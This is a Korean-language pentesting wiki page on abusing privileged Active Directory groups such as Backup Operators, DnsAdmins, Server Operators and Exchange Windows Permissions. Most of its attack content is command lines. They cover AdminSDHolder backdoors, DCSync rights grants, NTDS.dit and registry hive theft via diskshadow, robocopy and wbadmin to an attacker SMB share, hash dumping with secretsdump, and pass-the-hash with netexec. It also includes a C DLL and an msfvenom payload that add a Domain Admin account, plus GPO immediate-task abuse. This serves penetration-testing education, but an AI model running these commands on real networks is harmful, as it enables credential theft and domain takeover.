# Privileged Groups

{{#include ../../banners/hacktricks-training.md}}

## 관리 권한이 있는 Well Known groups

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

이 group은 도메인에서 administrators가 아닌 계정과 group을 생성할 수 있는 권한을 가집니다. 또한 Domain Controller (DC)에 로컬 로그인을 허용합니다.

이 group의 멤버를 식별하려면 다음 명령을 실행합니다:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
새 사용자를 추가할 수 있으며, DC에 로컬 로그인도 허용됩니다.<sup>[[1]](#references)</sup>

## AdminSDHolder 그룹

**AdminSDHolder** 그룹의 Access Control List(ACL)는 Active Directory 내의 모든 "protected groups"에 대한 권한을 설정하므로 매우 중요합니다. 여기에는 높은 권한을 가진 그룹도 포함됩니다. 이 메커니즘은 무단 수정을 방지하여 이러한 그룹의 보안을 유지합니다.

공격자는 **AdminSDHolder** 그룹의 ACL을 수정하여 일반 사용자에게 모든 권한을 부여할 수 있습니다. 이렇게 하면 해당 사용자가 모든 protected groups를 완전히 제어할 수 있습니다. 이 사용자의 권한이 변경되거나 제거되더라도 시스템 설계에 따라 1시간 이내에 자동으로 다시 부여됩니다.<sup>[[14]](#references)</sup>

최근 Windows Server 문서에서도 여러 기본 제공 operator groups를 **protected** 객체(`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` 등)로 취급합니다. **SDProp** 프로세스는 기본적으로 60분마다 **PDC Emulator**에서 실행되며, `adminCount=1`을 설정하고 protected 객체에서 inheritance를 비활성화합니다. 이는 persistence를 유지하는 데 유용하며, protected group에서 제거되었지만 여전히 inheritance가 비활성화된 ACL을 유지하는 오래된 privileged users를 hunting하는 데도 유용합니다.<sup>[[12]](#references)</sup>

멤버를 검토하고 권한을 수정하는 명령은 다음과 같습니다.
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
복원 프로세스를 신속하게 진행할 수 있는 script가 제공됩니다: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

자세한 내용은 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)을 참조하세요.<sup>[[14]](#references)</sup>

## AD Recycle Bin

이 그룹의 멤버십을 보유하면 삭제된 Active Directory 객체를 읽을 수 있으며, 이를 통해 민감한 정보가 노출될 수 있습니다:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
이는 **이전 권한 경로를 복구**하는 데 유용합니다. 삭제된 객체에도 `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, 이전 SPN 또는 나중에 다른 operator가 복원할 수 있는 삭제된 privileged group의 DN이 남아 있을 수 있습니다.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Domain Controller 접근

DC의 파일에 대한 접근은 사용자가 `Server Operators` 그룹에 속하지 않는 한 제한되며, 이 그룹에 속하면 접근 수준이 변경됩니다.

### Privilege Escalation

Sysinternals의 `PsService` 또는 `sc`를 사용하면 서비스 권한을 검사하고 수정할 수 있습니다. 예를 들어 `Server Operators` 그룹은 특정 서비스에 대한 모든 권한을 가지므로 임의의 명령을 실행하고 권한을 상승시킬 수 있습니다:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
이 명령은 `Server Operators`가 모든 권한을 보유하고 있어, 높은 권한을 얻기 위해 서비스를 조작할 수 있음을 보여줍니다.

## Backup Operators

`Backup Operators` 그룹의 구성원은 `SeBackup` 및 `SeRestore` 권한으로 인해 `DC01` 파일 시스템에 액세스할 수 있습니다. 이러한 권한을 사용하면 명시적인 권한이 없어도 `FILE_FLAG_BACKUP_SEMANTICS` 플래그를 통해 폴더 탐색, 목록 조회 및 파일 복사가 가능합니다. 이 프로세스에는 특정 스크립트를 사용해야 합니다.<sup>[[1]](#references)</sup>

그룹 구성원을 나열하려면 다음을 실행합니다:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Local Attack

이러한 privileges를 로컬에서 활용하기 위해 다음 단계를 수행합니다:

1. 필요한 libraries를 import합니다:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. `SeBackupPrivilege` 활성화 및 확인:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 제한된 디렉터리의 파일에 접근하고 복사합니다. 예를 들어:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

Domain Controller의 file system에 직접 access하면 모든 domain user와 computer의 NTLM hashes가 포함된 `NTDS.dit` database를 theft할 수 있습니다.

#### Using diskshadow.exe

1. `C` drive의 shadow copy를 생성합니다:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. 섀도 복사본에서 `NTDS.dit` 복사:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
또는 파일 복사에 `robocopy`를 사용합니다:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. 해시 검색을 위해 `SYSTEM` 및 `SAM` 추출:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. `NTDS.dit`에서 모든 해시 가져오기:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. 추출 후: Pass-the-Hash를 통한 DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### wbadmin.exe 사용

1. 공격자 시스템에서 SMB server용 NTFS filesystem을 설정하고 대상 시스템에 SMB credentials을 cache합니다.
2. `wbadmin.exe`를 사용하여 system backup 및 `NTDS.dit` extraction을 수행합니다:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

실습 시연은 [IPPSEC의 DEMO VIDEO](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s)를 참조하세요.

## DnsAdmins

**DnsAdmins** group의 members는 privileges를 악용하여 DNS server에서 SYSTEM privileges로 arbitrary DLL을 load할 수 있으며, 이러한 server는 종종 Domain Controllers에서 host됩니다. 이 capability는 상당한 exploitation potential을 제공합니다.

DnsAdmins group의 members를 나열하려면 다음을 사용합니다:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 임의의 DLL 실행 (CVE‑2021‑40469)

> [!NOTE]
> 이 취약점을 이용하면 DNS service(일반적으로 DC 내부)에서 SYSTEM privileges로 임의의 code를 실행할 수 있습니다. 이 문제는 2021년에 수정되었습니다.

Members는 다음과 같은 commands를 사용하여 DNS server가 임의의 DLL을 로드하도록 할 수 있습니다(로컬 또는 remote share에서).
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
DNS service를 재시작해야 DLL이 로드됩니다(추가 권한이 필요할 수 있음):
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
이 공격 벡터에 대한 자세한 내용은 ired.team을 참조하세요.

#### Mimilib.dll

특정 명령이나 reverse shell을 실행하도록 수정하여 command execution에 mimilib.dll을 사용하는 것도 가능합니다. [이 게시물](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)에서 자세한 내용을 확인하세요.<sup>[[15]](#references)</sup>

### MitM을 위한 WPAD 레코드

DnsAdmins는 global query block list를 비활성화한 후 WPAD 레코드를 생성하여 DNS 레코드를 조작하고 Man-in-the-Middle (MitM) 공격을 수행할 수 있습니다. Responder 또는 Inveigh와 같은 도구를 사용하여 네트워크 트래픽을 spoofing하고 캡처할 수 있습니다.

### Event Log Readers
멤버는 event logs에 액세스하여 평문 비밀번호나 command execution 세부 정보와 같은 민감한 정보를 찾을 수 있습니다:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

이 그룹은 도메인 객체의 DACL을 수정하여 잠재적으로 DCSync 권한을 부여할 수 있습니다. 이 그룹을 악용한 권한 상승 기법은 Exchange-AD-Privesc GitHub repo에 자세히 설명되어 있습니다.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
이 그룹의 구성원으로 행동할 수 있다면, 고전적인 악용 방법은 공격자가 제어하는 principal에 [DCSync](dcsync.md)에 필요한 replication 권한을 부여하는 것입니다:
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Historically, **PrivExchange**는 mailbox access, coerced Exchange authentication, LDAP relay를 연쇄적으로 사용해 동일한 primitive를 확보했습니다. 해당 relay 경로가 완화된 경우에도 `Exchange Windows Permissions`에 직접 가입되어 있거나 Exchange 서버를 제어할 수 있다면 domain replication rights로 이어지는 고가치 경로가 됩니다.

## Hyper-V Administrators

Hyper-V Administrators는 Hyper-V에 대한 전체 액세스 권한을 가지며, 이를 악용해 virtualized Domain Controllers를 제어할 수 있습니다. 여기에는 live DC를 cloning하고 `NTDS.dit` 파일에서 NTLM hashes를 추출하는 작업이 포함됩니다.

### Exploitation Example

실제 악용은 일반적으로 과거의 host-level LPE 기법보다는 **DC 디스크/checkpoint에 대한 offline access**를 이용합니다. Hyper-V host에 액세스할 수 있는 operator는 virtualized Domain Controller에 checkpoint를 생성하거나 이를 export하고, VHDX를 mount한 다음 guest 내부의 LSASS에 접근하지 않고도 `NTDS.dit`, `SYSTEM` 및 기타 secrets를 추출할 수 있습니다:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
그곳에서 `Backup Operators` workflow를 재사용하여 오프라인 상태에서 `Windows\NTDS\ntds.dit`와 레지스트리 하이브를 복사합니다.

## Group Policy Creators Owners

이 그룹을 통해 멤버는 도메인에서 Group Policy를 생성할 수 있습니다. 그러나 멤버는 사용자 또는 그룹에 Group Policy를 적용하거나 기존 GPO를 편집할 수 없습니다.

중요한 점은 **생성자가 새 GPO의 소유자가 되며**, 일반적으로 이후 해당 GPO를 편집할 수 있을 만큼 충분한 권한을 갖게 된다는 것입니다. 따라서 다음과 같은 경우 이 그룹이 흥미로운 대상이 됩니다.

- 악성 GPO를 생성한 후 관리자가 이를 대상 OU/도메인에 연결하도록 설득할 수 있는 경우
- 직접 생성한 GPO가 이미 유용한 위치에 연결되어 있고 이를 편집할 수 있는 경우
- GPO를 연결할 수 있는 다른 위임된 권한을 악용할 수 있으며, 이 그룹이 편집 권한을 제공하는 경우

실제 악용은 일반적으로 SYSVOL-backed policy files를 통해 **Immediate Task**, **startup script**, **local admin membership** 또는 **user rights assignment** 변경을 추가하는 방식으로 이루어집니다.<sup>[[3]](#references)[[4]](#references)[[13]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
`SYSVOL`을 통해 GPO를 수동으로 편집하는 경우, 변경 사항만으로는 충분하지 않습니다. 클라이언트가 정책을 새로 고치도록 하려면 `versionNumber`, `GPT.ini`, 그리고 경우에 따라 `gPCMachineExtensionNames`도 업데이트해야 합니다. 그렇지 않으면 클라이언트가 정책 새로 고침을 무시합니다.<sup>[[9]](#references)</sup>

## Organization Management

**Microsoft Exchange**가 배포된 환경에서는 **Organization Management**라는 특수 그룹이 중요한 기능을 보유합니다. 이 그룹은 **모든 도메인 사용자의 mailbox에 액세스**할 수 있는 권한을 가지며, **'Microsoft Exchange Security Groups'** Organizational Unit (OU)에 대한 **전체 제어 권한**을 유지합니다. 이 제어 권한에는 권한 상승에 악용될 수 있는 **`Exchange Windows Permissions`** 그룹도 포함됩니다.

### 권한 악용 및 명령

#### Print Operators

**Print Operators** 그룹의 구성원에게는 여러 권한이 부여되며, 여기에는 **`SeLoadDriverPrivilege`**도 포함됩니다. 이 권한을 사용하면 **Domain Controller에 로컬 로그온**하고, 시스템을 종료하며, 프린터를 관리할 수 있습니다. 특히 권한이 상승되지 않은 컨텍스트에서 **`SeLoadDriverPrivilege`**가 표시되지 않는 경우 이러한 권한을 악용하려면 User Account Control (UAC)을 우회해야 합니다.<sup>[[1]](#references)</sup>

이 그룹의 구성원을 나열하려면 다음 PowerShell 명령을 사용합니다:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
On Domain Controllers에서 이 그룹은 위험합니다. 기본 Domain Controller Policy가 **`SeLoadDriverPrivilege`**를 `Print Operators`에 부여하기 때문입니다. 이 그룹 구성원의 elevated token을 확보하면 해당 privilege를 활성화하고, 서명되었지만 취약한 driver를 로드하여 kernel/SYSTEM으로 jump할 수 있습니다.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup> Token 처리에 대한 자세한 내용은 [Access Tokens](../windows-local-privilege-escalation/access-tokens.md)을 확인하세요.

#### Remote Desktop Users

이 그룹의 구성원은 Remote Desktop Protocol (RDP)을 통해 PC에 액세스할 수 있습니다. 이러한 구성원을 열거하려면 PowerShell commands를 사용할 수 있습니다:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
RDP exploit에 대한 추가 insight는 전용 pentesting 리소스에서 확인할 수 있습니다.

#### Remote Management Users

이 그룹의 구성원은 **Windows Remote Management (WinRM)** 를 통해 PC에 액세스할 수 있습니다. 이러한 구성원의 enumeration은 다음을 통해 수행할 수 있습니다:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
**WinRM**과 관련된 exploitation techniques에 대해서는 관련 documentation을 참조해야 합니다.

#### Server Operators

이 그룹은 backup 및 restore privileges, system time 변경, system shutdown을 포함하여 Domain Controllers에서 다양한 구성을 수행할 수 있는 permissions을 가집니다.<sup>[[1]](#references)</sup> 멤버를 enumerate하려면 다음 command를 사용합니다:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
도메인 컨트롤러에서 `Server Operators`는 일반적으로 **서비스를 재구성하거나 시작/중지**할 수 있는 충분한 권한을 상속하며, 기본 DC 정책을 통해 `SeBackupPrivilege`/`SeRestorePrivilege`도 부여받습니다. 실제로 이는 **서비스 제어 악용**과 **NTDS 추출**을 연결하는 가교 역할을 합니다:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
서비스 ACL이 이 그룹에 변경/시작 권한을 부여하는 경우, 서비스를 임의의 command를 가리키도록 설정하고 `LocalSystem`으로 시작한 다음 원래 `binPath`를 복원합니다. 서비스 제어가 제한된 경우, 위의 `Backup Operators` techniques로 전환하여 `NTDS.dit`를 복사합니다.

## References

- [1] [ired.team – Privileged Accounts and Token Privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abusing SeLoadDriverPrivilege for Privilege Escalation](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abusing GPO Permissions](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – GPO Abuse - Part 1](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – A Red Teamer's Guide to GPOs and OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Undocumented NT Internals – NtLoadDriver Function](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [11] [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Appendix C: Protected Accounts and Groups in Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – How to Abuse and Backdoor AdminSDHolder to Obtain Domain Admin Persistence](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abusing DnsAdmins Privilege for Escalation in Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)

{{#include ../../banners/hacktricks-training.md}}
